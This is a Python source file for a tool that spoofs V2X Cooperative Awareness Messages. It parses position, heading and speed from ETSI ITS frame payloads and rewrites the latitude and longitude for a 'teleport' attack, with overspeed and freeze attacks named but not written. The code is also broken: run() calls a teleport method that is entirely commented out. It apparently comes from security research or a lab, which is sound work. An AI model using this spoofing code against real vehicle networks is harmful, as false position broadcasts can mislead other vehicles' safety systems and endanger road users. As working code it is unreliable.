from sniffer import CAMSniffer
import sys
import os
import math
import random

# Add parent directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from app.modules import CoordinatesGenerator

from enum import Enum

class ATTACK_TYPES(Enum):
    TELEPORT = 1
    OVERSPEED = 2
    FREEZE = 3

class CAMSpoofer:
    def __init__(self, mac, payload, attack_type=ATTACK_TYPES.TELEPORT):
        self.attack_type = attack_type
        self.mac = mac
        self.payload = bytearray(payload)  # Make mutable for modification
        self.lat, self.lon, self.heading, self.speed = None, None, None, None
        
    """  Payload is bytes 14-98 inside the frame
        ❗Important: for every payload manipulation
         substract 14 from each byte index   """ 
        
    def run(self):
        self.process_valuies()
        
        if self.attack_type == ATTACK_TYPES.TELEPORT:
            print(f"   📌 Executing Teleport Attack...")
            self.teleport()
            
    
    # def teleport(self):
    #     """Teleport coordinates 2km away from current position."""
    #     # Convert from ETSI format (1/10 microdegrees) to decimal degrees
    #     lat_degrees = self.lat / 10_000_000.0
    #     lon_degrees = self.lon / 10_000_000.0
        
    #     print(f"      Original position: ({lat_degrees:.6f}, {lon_degrees:.6f})")
        
    #     # Generate new position 2km away using spherical geometry
    #     new_lat, new_lon = CoordinatesGenerator.random_location_within_radius(
    #         (lat_degrees, lon_degrees), 
    #         radius_m=2000  # 2km
    #     )
        
    #     print(f"      Spoofed position:  ({new_lat:.6f}, {new_lon:.6f})")
        
    #     # Convert back to ETSI format (1/10 microdegrees)
    #     self.lat = int(new_lat * 10_000_000)
    #     self.lon = int(new_lon * 10_000_000)
        
    #     # Update the payload with new coordinates
    #     self.modify_payload()
        
    #     print(f"   ✅ Teleportation complete: ~{self._calculate_distance(lat_degrees, lon_degrees, new_lat, new_lon):.0f}m away")
    
    def _calculate_distance(self, lat1, lon1, lat2, lon2):
        """Calculate distance between two points using haversine formula."""
        R = 6371000  # Earth radius in meters
        phi1 = math.radians(lat1)
        phi2 = math.radians(lat2)
        delta_phi = math.radians(lat2 - lat1)
        delta_lambda = math.radians(lon2 - lon1)
        
        a = math.sin(delta_phi/2)**2 + math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda/2)**2
        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
        
        return R * c
        
    
    def process_valuies(self):
   
        """   From ETSI EN 302 636-4-1 'Long Position Vector' (9.5.2) paragraph
              We utilize the definied structure (Figure 9.5.2.1)
              In our custom network frame it is found in bytes 26-49 
              From this section we will substract the Lat, Long values   """
        
        lpv_payload = self.payload[26-14:49-14]
        # From 9.5.2.2 Fields: Latitude and Longitude are 4 bytes each (unsigned int32)
        lat_payload = lpv_payload[12:16]  # 4 bytes for latitude
        lon_payload = lpv_payload[16:20]  # 4 bytes for longitude
        self.lat = int.from_bytes(lat_payload, byteorder='big', signed=False)
        self.lon = int.from_bytes(lon_payload, byteorder='big', signed=False)
        
        
        """ Inside Intelligent Transport Systems (Bytes 58-98)
            using ETSI TS 102 894-2 V1.3.1 (ITS Data Dictionary)
            we subtract the following:
                - speed
                - heading   """ 
        
        its_payload = self.payload[58 - 14:]
        heading_payload = its_payload[84 - 58 : 85 - 58]
        speed_payload = its_payload[86 - 58 : 87 - 58]
        self.heading = int.from_bytes(heading_payload, byteorder='big', signed=False)
        self.speed = int.from_bytes(speed_payload, byteorder='big', signed=False)
    
    def modify_payload(self):
        """Update payload with modified values."""
        
        lat_bytes = self.lat.to_bytes(4, byteorder='big', signed=False)
        lon_bytes = self.lon.to_bytes(4, byteorder='big', signed=False)
        
        # Calculate absolute positions in payload
        lpv_start = 26 - 14
        lat_start = lpv_start + 12  # Latitude at offset 12 in LPV
        lon_start = lpv_start + 16  # Longitude at offset 16 in LPV
        
        # Update latitude (4 bytes)
        self.payload[lat_start:lat_start+4] = lat_bytes
        
        # Update longitude (4 bytes)
        self.payload[lon_start:lon_start+4] = lon_bytes
        
        # If heading and speed need updating (uncomment if needed)
        # heading_bytes = self.heading.to_bytes(2, byteorder='big', signed=False)
        # speed_bytes = self.speed.to_bytes(2, byteorder='big', signed=False)
        # its_start = 58 - 14
        # self.payload[its_start + (84-58):its_start + (84-58) + 2] = heading_bytes
        # self.payload[its_start + (86-58):its_start + (86-58) + 2] = speed_bytes
        
    def get_modified_payload(self):
        return self.payload
        
        
        
        
        
        
        
        